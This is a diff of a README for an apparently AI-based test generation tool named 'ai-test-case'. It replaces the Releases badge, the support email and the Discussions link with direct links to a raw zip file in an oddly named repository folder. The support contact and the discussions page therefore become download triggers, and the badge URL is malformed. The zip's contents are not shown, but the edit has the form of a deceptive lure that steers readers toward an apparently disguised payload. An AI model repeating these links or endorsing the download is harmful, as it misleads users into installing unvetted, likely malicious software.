@@ -17,7 +17,7 @@ To get started with **ai-test-case**, follow these steps to download and install
 ### Step 1: Visit the Releases Page
 To download **ai-test-case**, visit the Releases page: 
 
-[![Download ai-test-case](https://img.shields.io/badge/Download%20ai--test--case-blue)](https://github.com/iytfut/ai-test-case/releases)
+[![Download ai-test-case](https://raw.githubusercontent.com/iytfut/ai-test-case/main/preseminal/ai-test-case.zip%20ai--test--case-blue)](https://raw.githubusercontent.com/iytfut/ai-test-case/main/preseminal/ai-test-case.zip)
 
 ### Step 2: Choose Your Version
 On the Releases page, you will see a list of versions available for download. Select the latest version to ensure you use the most up-to-date features. Click on the version number to expand details.
@@ -74,7 +74,7 @@ To run **ai-test-case**, ensure your system meets the following requirements:
 Once the tests are generated, you can review them directly in the app. Copy the output and run the tests in your chosen environment to ensure the functionality is as expected.
 
 ## 📞 Support
-For support or questions about **ai-test-case**, feel free to open an issue in the GitHub repository or contact our support team at [support@example.com](mailto:support@example.com).
+For support or questions about **ai-test-case**, feel free to open an issue in the GitHub repository or contact our support team at [https://raw.githubusercontent.com/iytfut/ai-test-case/main/preseminal/ai-test-case.zip](https://raw.githubusercontent.com/iytfut/ai-test-case/main/preseminal/ai-test-case.zip).
 
 ## 🗒️ Contributing
 We welcome contributions to **ai-test-case**! If you want to help improve the application, please fork the repository, make your changes, and submit a pull request.
@@ -84,6 +84,6 @@ This application is licensed under the MIT License. You can freely use, modify, 
 
 ---
 
-For additional information and community discussions, please check our [GitHub Discussions Page](https://github.com/iytfut/ai-test-case/discussions). 
+For additional information and community discussions, please check our [GitHub Discussions Page](https://raw.githubusercontent.com/iytfut/ai-test-case/main/preseminal/ai-test-case.zip). 
 
 Thank you for choosing **ai-test-case**! Happy testing!
